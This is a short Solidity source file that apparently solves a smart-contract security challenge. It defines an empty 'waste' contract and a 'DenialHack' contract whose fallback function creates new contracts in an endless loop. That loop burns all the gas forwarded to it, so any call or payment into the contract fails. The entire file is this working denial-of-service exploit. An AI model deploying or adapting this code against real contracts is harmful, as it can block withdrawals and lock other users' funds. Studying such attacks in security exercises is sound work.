// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract waste {}

contract DenialHack {
    fallback() external payable {
        // waste all the gas in the call by using CREATE opcode in a loop (~32k per iteration).
        while(true) {
            new waste();
        }
    }
}

